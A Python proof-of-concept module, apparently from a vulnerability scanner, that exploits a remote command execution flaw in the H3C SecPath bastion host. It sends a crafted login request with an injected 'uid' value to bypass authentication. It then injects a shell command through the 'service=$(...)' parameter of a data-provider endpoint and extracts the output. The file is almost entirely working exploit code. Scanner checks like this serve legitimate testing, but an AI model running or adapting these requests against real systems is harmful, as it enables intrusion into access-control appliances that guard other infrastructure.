# -*- coding:utf-8 -*-
# H3C SecParh堡垒机远程命令执行
import re

import requests

from .. import fileUtil
from ServiceScanModel.models import ServiceScan
from vulscan_Project.requestClass import Requests


session = requests.session()

class POC:

    def __init__(self, service: ServiceScan):
        self.service = service
        self.requestUtil= Requests(service.cookies)
        self.result = False


    def login(self, url, session):
        resp = self.requestUtil.get(
            url + "/audit/gui_detail_view.php?token=1&id=%5C&uid=%2Cchr(97))%20or%201:%20print%20chr(121)%2bchr(101)%2bchr(115)%0d%0a%23&login=admin",
            session=session)
        return True


    def rce(self, url, session, cmd="whoami"):
        resp = self.requestUtil.get(
            url + "/audit/data_provider.php?ds_y=2019&ds_m=04&ds_d=02&ds_hour=09&ds_min40&server_cond=&service=$(%s)&identity_cond=&query_type=all&format=json&browse=true" % cmd,
            session=session)
        if "--service=" in resp.text:
            return re.findall(r'--service=(.*?)"', resp.text)[0]
        else:
            return False


    def fingerprint(self):
        try:
            if self.service.url:
                resp = self.requestUtil.get(self.service.url)
                if "H3C SecPath 运维审计系统" in resp.text:
                    return True
        except:
            return False


    def poc(self):
        try:
            self.login(self.service.url, session)
            result = self.rce(self.service.url, session)
            if result:
                return ["H3C SecParh堡垒机远程命令执行", "当前用户: %s" % result]
        except Exception as e:
            print(e)
            return []
